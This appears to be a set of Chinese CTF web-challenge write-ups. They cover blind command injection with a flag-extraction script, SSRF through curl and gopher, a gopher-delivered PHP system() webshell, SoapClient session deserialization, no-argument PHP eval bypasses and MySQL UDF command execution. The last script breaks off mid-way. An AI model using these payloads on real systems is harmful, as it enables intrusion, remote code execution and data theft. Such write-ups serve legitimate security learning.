<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>一开始提交了一下ls发现就返回一个200，不知道命令有没有执行，跑一个sleep 3，有明显延迟，证明存在命令执行，但是没有回显<br>试着弹一下shell，无果，用curl访问一下外网，无反应，证实不能连接外网。<br>那就只能用判断语句来搜集信息了<br>查一下shell语法<br><a href="https://www.cnblogs.com/AloneSword/p/4489098.html">https://www.cnblogs.com/AloneSword/p/4489098.html</a><br>可以用<code>if [ -f /flag.txt ]; then sleep 3; fi;</code>硬猜出来了flag位置（运气比较好）<br>接下来就是测flag内容，同样用时间盲注<br><code>bash -c &quot;if [[ \&quot;$(cat /flag.txt)\&quot; = flag&#123;* ]]; then sleep 3; fi;&quot;</code><br>这里一开始判断语句一直出问题，最后用了[[ “$()”” &#x3D; reg ]]这种形式终于搞了出来，一开始没有加外层的bash -c，结果就一直执行不出来，一开始还以为是把cat之类的给禁了，换了几个类似的读文件命令还是不行，最后突然想起来是不是用的不是bash，加了一个bash -c之后可以用了<br>贴一个自动注入脚本</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
str1 <span class="token operator">=</span> <span class="token string">"1234567890qwertyuiopasdfghjklzxcvbnm_-QWERTYUIOPASDFGHJKLZXCVBNM{}"</span>
url <span class="token operator">=</span> <span class="token string">"http://119.3.37.185/"</span>
payload <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> str1<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"cmd"</span><span class="token punctuation">:</span> <span class="token string">'bash -c "if [[ \"$(cat /flag.txt)\" = %s* ]]; then sleep 3; fi;"'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>payload <span class="token operator">+</span> s<span class="token punctuation">)</span><span class="token punctuation">}</span>
        start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        end <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> end <span class="token operator">-</span> start <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> s
            <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
</code></pre>
<h2 id="easyseed"><a href="#easyseed" class="headerlink" title="easyseed"></a>easyseed</h2><p>垃圾题，点名批评，啥也不给，需要扫描才能拿到一个加密脚本，为index.bak，然后就是经典的PHP随机数种子爆破，爆破出来之后提交也不会对，因为需要把XFF换成127.0.0.1，为什么呢，因为这个是超级脑洞，猜！</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>bash</tag>
      </tags>
  </entry>
  <entry>
    <title>babyt5</title>
    <url>/babyt5.html</url>
    <content><![CDATA[<h1 id="babyt5-wp"><a href="#babyt5-wp" class="headerlink" title="babyt5 wp"></a>babyt5 wp</h1><p>今天在做什么第五届上海大学生网络安全大赛的一道题，好像是安恒月赛的一道题，感觉题目问题也挺大，有机会自己搭环境搞一搞，对着wp复现了一遍</p>
<h2 id="二次编码绕过"><a href="#二次编码绕过" class="headerlink" title="二次编码绕过"></a>二次编码绕过</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$x</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">,</span><span class="token string">"php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pos</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"denied"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token string">"$x"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span>
</code></pre>
<p>首先得想办法对strpos进行绕过，按常理来说我们如果把php放在最前面就可以绕过个strpos函数，但是curl不支持PHP伪协议(可用curl –version查看支持的协议)，于是出现了这个二次编码绕过<br>用%2570代替p即可绕过对于strpos的检验，详见<a href="https://bugs.php.net/bug.php?id=76671&amp;edit=1">https://bugs.php.net/bug.php?id=76671&amp;edit=1</a><br>事实上个人感觉是数据发送到服务器端进行第一次解码，而curl发起第二次请求时进行了第二次的解码，也就意味着这并不是strpos的问题，而是一个来自二次编码绕过的问题</p>
<h2 id="file-x2F-x2F-读文件"><a href="#file-x2F-x2F-读文件" class="headerlink" title="file:&#x2F;&#x2F;读文件"></a>file:&#x2F;&#x2F;读文件</h2><p>有了curl，可以用file:&#x2F;&#x2F;协议申请本地文件，读了index.php之后试着读了一下flag.php，结果flag.php里面只有一个提示说要读&#x2F;etc&#x2F;hosts<br>说实话一开始不知道这个是个什么文件，但是里面有一个很明显的ip地址172.18.0.3，马师傅说是内网地址QWQ<br>菜了，这样子curl肯定就是以SSRF的形式去打内网了</p>
<h2 id="SSRF攻击内网服务器"><a href="#SSRF攻击内网服务器" class="headerlink" title="SSRF攻击内网服务器"></a>SSRF攻击内网服务器</h2><p>首先是扫网段，发现172.18.0.1|2都是可以访问的，172.18.0.3就是本机，并且在访问172.18.0.2发现在注释中出现了一个<code>include $_GET[&#39;a&#39;]</code>，进入文件包含阶段<br>包含的时候一开始我智障操作了一波&amp;a&#x3D;xxxx，这里我们是以curl的get请求请求到内网服务器上去的，使用我们的a应该是跟在对内网的请求url上的一个参数，即以?a&#x3D;xxxx的形式进行请求，实在是太菜了才会犯的低级错误，记下来</p>
<h2 id="gopher伪协议"><a href="#gopher伪协议" class="headerlink" title="gopher伪协议"></a>gopher伪协议</h2><p>本来按道理来说绕来绕去该直接拿flag了，我们完全有理由认为flag就位于内网ip为127.18.0.3的这台服务器上，然而这个服务器上没得flag.php，不会做了</p>
<p>注意一点，这个时候我们这里curl只能进行一个get请求，无法进行更多的操作<br>因此这个时候就需要用gopher伪协议，gopher伪协议就是可以让我们把伪协议输入的内容作为一个完整的包，自由控制包的内容进而getshell，在对内网只能进行简单访问的时候通过这个伪协议就可以对内网进行任意的请求，自由翱翔于内网<br>接下来是马师傅的想法：比如这里我们对x使用gopher伪协议，发一个post的包。<br>在这个post的包中我们的参数x就是对内网中172.18.0.2服务器的访问，而a则是php:&#x2F;&#x2F;input伪协议，这样子文件包含就会包含我们post的内容，我们用input写一个一句话，然后紧接着把后门密码补上访问一波就可以了。<br>注意包构造时换号要以%0d%0a代替，然后空格什么的也要url编码一下<br>样例包如下<br>注意gopher使用格式为<code>gopher:/ip:port/_ + payload</code>第一次用没加ip和端口我是真的傻</p>
<pre><code>GET /?x=gopher://172.18.0.2:80/_POST%20/?x%3dhttp://172.18.0.2:80?a%3dph%2570://input%26b=ls%20HTTP/1.1%0d%0aHost:%2047.104.170.59:7302%0d%0aContent-Length:%2030%0d%0a%0d%0a&lt;?ph%2570%20system($_GET[&#39;b&#39;]);%20?&gt; HTTP/1.1
Host: 47.104.170.59:7302
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

</code></pre>
<p>打过去一开始400，后来改了改没有400了，但是也没有回显，可能是b那里不知道url编码把&amp;改成%26之后包发过去还解不解析，不改的话这个包就会认为b是另一个参数，更加没戏</p>
<h2 id="gopher攻击stmp邮件服务"><a href="#gopher攻击stmp邮件服务" class="headerlink" title="gopher攻击stmp邮件服务"></a>gopher攻击stmp邮件服务</h2><p>wp的思路，除了扫网段还扫了端口，发现25端口还开了一个邮件服务，所以就得那gopher对stmp服务配合文件包含发起攻击了<br>有现成的工具:<a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a> 自动生成包，里面用法也都写下来了，思路就是对其发送一个内容带有shell的包，然后包乱写肯定会有问题，就会进入到其日志中去，然后我们通过猜测默认日志路径找到日志文件，进行对目录文件进行包含，被包含的文件会作为php代码执行，这样子日志中的那一句shell就可以用了，但是这道题题目感觉是有问题的，日志里面已经可以读到shell了，但是执行还是不给执行，我看的wp里也说环境出了问题，最后权且是对着wp里的flag路径读了一波读出来的，有点无奈。</p>
<h2 id="后记1"><a href="#后记1" class="headerlink" title="后记1"></a>后记1</h2><p>对于什么时候用什么协议感觉我有时候人还是傻傻的，注意curl支持的协议有http(s),gopher,file等，file只能读本地文件，但是不能使用PHP伪协议，就不能使用php:&#x2F;&#x2F;filter进行编码读取，这样子读取php文件时&lt;&gt;会被浏览器认为是注释，需要查看源码才能看见。<br>而使用文件包含时则可以使用input,filter等php伪协议，进行写入文件包含、源码读取等操作，如果是其他类型的文件好像直接填写路径就包含进来可以直接看了(其实也不是太懂，昨天读日志的时候不能要先编码再读，不然读不到，今天本地测试的时候又直接读出来了？)总之实在不行全都编码解码问题不大</p>
<h2 id="参考的wp"><a href="#参考的wp" class="headerlink" title="参考的wp"></a>参考的wp</h2><p><a href="https://www.jianshu.com/p/804d95f6d6fb">https://www.jianshu.com/p/804d95f6d6fb</a></p>
<h2 id="后记2"><a href="#后记2" class="headerlink" title="后记2"></a>后记2</h2><p>重新学习了一遍gopher，解决一些问题<br>首先gopher使用方式要记牢，不要漏了<br><code>gopher://ip:port/_内容</code>要加ip和端口，并且内容前面要加一个下划线</p>
<h3 id="二次编码"><a href="#二次编码" class="headerlink" title="二次编码"></a>二次编码</h3><p>gopher发包内容是需要二次编码的，一次编码在发过去的时候会在服务器进行解码，但是gopher还会再进行一次请求，这次请求会在服务器再进行一次解码，不编码可能导致请求中一些特殊字符影响执行，因此需要二次编码<br>但是需要注意，平常需要编码的数据进行二次编码，比如空格<br>而本身具有特殊意义的字符如&amp;&#x3D;?等则只需一次编码即可</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/qq_44632668/article/details/102631585">https://blog.csdn.net/qq_44632668/article/details/102631585</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>文件包含</tag>
        <tag>gopher</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>LCTF bestphp&#39;s revenge</title>
    <url>/bestphp&#39;s%20revenge.html</url>
    <content><![CDATA[<h1 id="LCTF-bestphp’s-revenge"><a href="#LCTF-bestphp’s-revenge" class="headerlink" title="LCTF bestphp’s revenge"></a>LCTF bestphp’s revenge</h1><p>记录一个获得了马师傅肯定的题目</p>
<h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'implode'</span><span class="token punctuation">;</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token function">reset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'welcome_to_the_lctf2018'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<h3 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h3><pre class=" language-php"><code class="language-php"><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'LCTF{*************************}'</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">"REMOTE_ADDR"</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
       <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
only localhost can get flag<span class="token operator">!</span>
</code></pre>
<h2 id="SESSION反序列化"><a href="#SESSION反序列化" class="headerlink" title="SESSION反序列化"></a>SESSION反序列化</h2><p>首先需要知道，php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，PHP的session在存入时会进过序列化，再使用时在通过反序列化，存储方式就是由配置项的session.save_handler来进行确定的，不同的save_hanld存在着不同的序列化反序列化操作，从而引起反序列化漏洞。</p>
<blockquote>
<p>php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值<br>php 键名+竖线（|）+经过serialize()函数处理过的值<br>php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</p>
</blockquote>
<p>PHP一般默认使用php的序列化方式，这里我们可以通过<code>call_user_func</code>来调用session_start()函数将其序列化方式变为php_serialize方式，而我们构造的数据为<code>|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code><br>注意数据最前端的那个’|’，在以php方式进行反序列化时，’|’作为一个分隔符，将后方的数据作为一个对象进行反序列化，构造出了一个soapclient对象，前方原本为php_serialize序列化的数据全部被作为键名写入了session中。</p>
<p>此时，我们就获得了一个储存在本地的SoapClient对象</p>
<h2 id="SoapClient执行ssrf"><a href="#SoapClient执行ssrf" class="headerlink" title="SoapClient执行ssrf"></a>SoapClient执行ssrf</h2><p>SoapClient为PHP的一个内置类，因此我们在题目代码未包含类的情况下也可对该对象进行反序列化，而其拥有一个魔法方法__call()，调用时会发起一次soap请求（大概就是一次访问吧，访问目标可以由其location成员控制），本地测试后发现虽然请求会发出，但是运行时会直接抛出一个fatal error导致程序直接退出，后面部分就没法运行了</p>
<p>这里就通过存储与本地服务器session中的一个SoapClient对象对flag.php发起了访问，实现了SSRF。绕过了对REMOTE_ADDR的限制（实际上REMOTE_ADDR的绕过是非常困难的），这里存在一个var_dump函数，可以直接把SoapClient对象的内容都倒出来，所以我们直接查看SoapClient对本地服务器访问的这个cookie，然后把自己的cookie修改成它的，就可以假装成为本地登录获取flag了</p>
<h2 id="SoapClient扩展内容"><a href="#SoapClient扩展内容" class="headerlink" title="SoapClient扩展内容"></a>SoapClient扩展内容</h2><p>实际上SoapClient功能原不止如此，我们可以通过构造其ua数据实现对报文header部分的完全控制，即CRLF<br>参考N1CTF的Easy&amp;&amp;Hard PHP，该题目环境也是要求绕过REMOTE_ADDR，同样是通过SoapClient进行SSRF，而这里不存在对SoapClient对象的var_dump，我们可以通过构造一个自己的header发起ssrf访问，这样子就可以通过已构造的cookie伪装进行登录。<br>除此之外，SoapClient可以实现控制整个报文，修改Content-Type实现对特定数据的post</p>
<p>参考链接：<br><a href="https://xz.aliyun.com/t/3341#toc-22">https://xz.aliyun.com/t/3341#toc-22</a><br><a href="https://cloud.tencent.com/developer/article/1376384">https://cloud.tencent.com/developer/article/1376384</a><br><a href="https://xz.aliyun.com/t/2148">https://xz.aliyun.com/t/2148</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>反序列化</tag>
        <tag>php</tag>
        <tag>SSRF</tag>
        <tag>SoapClient</tag>
      </tags>
  </entry>
  <entry>
    <title>decade wp</title>
    <url>/decade%20wp.html</url>
    <content><![CDATA[<h1 id="decade-wp"><a href="#decade-wp" class="headerlink" title="decade wp"></a>decade wp</h1><p>复现复现，是一道bytectf修改了的题，加了几个过滤</p>
<h2 id="无参数函数的命令执行"><a href="#无参数函数的命令执行" class="headerlink" title="无参数函数的命令执行"></a>无参数函数的命令执行</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[a-z]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">echo</span> <span class="token string">'bye~'</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"No way!!!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string">"No way!!!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>贴一下源码</p>
<p>这个正则大概意思就是只允许无参数的函数调用，并且函数还得是全英文的，不能有下划线数字之类的，(?R)表示引用当前正则表达式，?匹配一次或零次，也就是可以<code>func1(func2(func3(())))</code>这样子，后来看了师傅们的payload发现还可以<code>func1(func2())func3()</code>这个样子</p>
<h2 id="无中生有的用函数返回值获取字符串"><a href="#无中生有的用函数返回值获取字符串" class="headerlink" title="无中生有的用函数返回值获取字符串"></a>无中生有的用函数返回值获取字符串</h2><p>各种各样的神仙技巧，要求对各个函数的功能足够熟练才能做出来了，fuzz跑出内置函数然后做数学题或者各种各样的变换，我只能列一下学到的知识了</p>
<h3 id="获取’-’"><a href="#获取’-’" class="headerlink" title="获取’.’"></a>获取’.’</h3><h4 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h4><p>第一步，用chr(47)获取<code>.</code>，第二步，想办法无中生有一个数字出来，大佬的fuzz跑出来了一个phpversion函数，返回一个当前版本号，7.xxx，然后开始做数学题（我不太清楚这个数学题怎么做的）<br><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>&#x3D;47<br>这样子我们就可以访问当前目录了</p>
<h4 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h4><p>fuzz测试出localeconv()函数返回数组的第一位是<code>.</code>，就能直接current(localeconv())拿到</p>
<h4 id="思路三"><a href="#思路三" class="headerlink" title="思路三"></a>思路三</h4><p>用crypt函数对字符串进行加密，有概率在最后一位出现一个<code>.</code>，然后strrev翻转字符串，chr(ord())取得第一位，概率获得一个<code>.</code><br><code>chr(ord(strrev(crypt(($arg)))))</code>这里的arg好像是啥都行，数字，bool值都可以<br>所以用phpversion()也好，接着chdir()也好，都能用，就是概率性问题<br>还有见到用<code>serialize(array())</code>来获取字符串的</p>
<h3 id="获取’-’穿越目录"><a href="#获取’-’穿越目录" class="headerlink" title="获取’..’穿越目录"></a>获取’..’穿越目录</h3><p>flag在上级目录，所以我们还得拿一个<code>..</code>进行目录穿越，在执行ls -a的时候，列出来的目录的第二位是一个<code>..</code>，所以我们next(scandir())就能获得<code>..</code></p>
<h3 id="跳完目录还得再获取一个’-’"><a href="#跳完目录还得再获取一个’-’" class="headerlink" title="跳完目录还得再获取一个’.’"></a>跳完目录还得再获取一个’.’</h3><p>需要chdir穿越目录之后再来一个<code>.</code>，chdir的返回值是一个布尔值true，大佬说用localtime(time(true))可以构造一个47出来，因为时间不同会随之变化，但是实际上我试的时候怎么试都是0，该方案只得作罢<br>否则如果成功穿越目录并scandir的话，可以继续使用next(),current(),end()等函数读取处于特定位置的文件<br>样例payload:<code>echo(readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))))))))))))));</code><br>又：本地测试时显示pos函数的返回值为空，查一下发现可以用current函数代替，不知道大佬是怎么做出来的</p>
<h3 id="跳目录与读文件分开的奇妙操作"><a href="#跳目录与读文件分开的奇妙操作" class="headerlink" title="跳目录与读文件分开的奇妙操作"></a>跳目录与读文件分开的奇妙操作</h3><p>可以用if()func()这样的语法执行跳目录，在if里面跳目录，然后chdir返回一个true，if语句就通过了，再在后面执行读文件，不得不说是非常高级的思路了（然而我读的时候没意识到正则还能这么匹配过去）<br>所以我们<code>if(chdir(..))readfile(scandir(.))</code>，根据scandir的情况选择用哪个函数读取处于哪个位置的文件</p>
<h2 id="本题payload"><a href="#本题payload" class="headerlink" title="本题payload"></a>本题payload</h2><p>以上部分均为bytectf的boring_code，这之前还有一层跳转的绕过，本题去掉了之前的一层又多加了几个过滤，把我们做数学题时用到的sqrt，获取第二个<code>.</code>的time，local，还有读文件的readfile和分开跳目录读文件的if给禁止了，可以用一些相关函数代替<br>if只是为了分开执行一下语句，我们用一个while也可以达到同样的效果，数学方法没得了就可以用之前提到的加密方法去做，不过存在了一定的随机性<br>readfile被禁止了可以用file函数代替，不同的是file函数会把文件分行读进一个数组里，print_r，var_dump带下划线不能用了，echo会输出Array，又是current，next，end几个函数读特定行<br>payload:<code>while(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))echo(next(file(end(scandir(chr(ord(strrev(crypt(serialize(array()))))))))));</code></p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>其实看看禁用的列表也能得到部分出题人对这种绕过的思路<br>strlen就是一个获得数字的方法，info估计就能获得各种各样的字符了，rand生成随机数，bin，hex二进制十六进制应该也能整出数字来</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://zeroyu.xyz/2019/09/14/2019-bytectf-writeup/tp://zeroyu.xyz/2019/09/14/2019-bytectf-writeup/">http://zeroyu.xyz/2019/09/14/2019-bytectf-writeup/tp://zeroyu.xyz/2019/09/14/2019-bytectf-writeup/</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>bytectf2021final复现</title>
    <url>/bytectf2021final%E5%A4%8D%E7%8E%B0.html</url>
    <content><![CDATA[<h1 id="bytectf2021final复现"><a href="#bytectf2021final复现" class="headerlink" title="bytectf2021final复现"></a>bytectf2021final复现</h1><p>菜狗并没有打进ByteCTF2021 final，但是在比赛结束之后环境并没有立即关闭，感谢rmb神仙带我，让我进行复现呜呜</p>
<h2 id="seo"><a href="#seo" class="headerlink" title="seo"></a>seo</h2><p>一个前端写的还挺好看的站，有一些乱七八糟的功能，写了好几个api，实际上有用的只有一个词库里面的任意文件下载，然后下&#x2F;api&#x2F;ip.php，有一个curl的ssrf<br>这个ssrf还把请求的结果base64一下再返回，真的是很贴心的配合gopher的操作，就是接下来的操作并不是非常的人性化，扫网段找服务？先读&#x2F;etc&#x2F;hosts确定机器的网段是<code>172.73.23.0/24</code>，然后我也不知道扫什么服务就硬扫全网段？有点离谱<br>rmb神仙说先扫gopherus里面常见的能打的服务，扫全端口肯定不现实，所以是扫整个网段内的特定端口，比如redis，mysql之类的，因此可以在172.73.23.100:3306上扫到一个mysql。（我还是觉得离谱）</p>
<p>看了下wm的wp，读了<code>/proc/net/arp</code>，能够迅速的发现172.73.23.100的存在</p>
<p>gopher打mysql是需要账户没有密码的，有密码要交互，打不通。所以直接root无密码一把梭，先select一个12345试试，成了，能打SQL<br>然后数据库中无内容，需要打mysql执行命令。可以先执行一下<code>show variable like &#39;secure_file_priv&#39;</code>看一下有没有写文件权限，为空就任意写，然后再看<code>show variable like &#39;plugin_dir&#39;</code>看插件目录是在哪<br>mysql5.1后规定加载插件只能从插件目录下加载，插件目录存在+允许mysql写文件，接下来就是经典的UDF提权操作了（虽然这里是命令执行），windows下可能因为mysql运行权限比较高，一般来说是提权</p>
<p>UDF -&gt; user defined function，允许用户自定义mysql函数，写一个.so&#x2F;dll放到插件目录下加载，即可像使用内置函数一样使用自定义函数，扩展性极强</p>
<p>需要.so&#x2F;dll符合平台类型以及mysql的位数，自己写一个还需要下一堆mysql相关的文件，所以我们直接用msf里面自带的<br>udf的写入也是一个问题，可以直接把整个二进制文件转换成base64或者hex编码，然后整个塞进查询语句里面，直接into dumpfile。然后<code>CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;</code>加载写入的so<br>如果环境是公有的，还可以直接用<code>select * from mysql.func</code>看一下已经定义了的udf，看能不能急速上车，防止别人上车也很容易，用完用<code>drop function sys_eval</code>把函数删了就行</p>
<p>这里我不知道为什么出问题，我先把整个文件hex编码放进gopherus里面，再把输出的payload粘贴到脚本里面跑，总是跑不起来，我一开始怀疑是长度过大了，准备使用创建一个临时表，分段往表里面写数据的形式写入，再一口气导出的操作，所以把gopherus里面mysql的部分扒了出来缝合上去，不然没法自动化。结果缝合了之后又一把跑通了，玄幻<br>缺点就是gopherus python2写的，和python3的差距似乎在于对string和byte之间的转换上，懒得查怎么回事，就直接改Python2跑了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> json

user <span class="token operator">=</span> <span class="token string">"root"</span>
encode_user <span class="token operator">=</span> user<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span>
user_length <span class="token operator">=</span> len<span class="token punctuation">(</span>user<span class="token punctuation">)</span>
temp <span class="token operator">=</span> user_length <span class="token operator">-</span> <span class="token number">4</span>
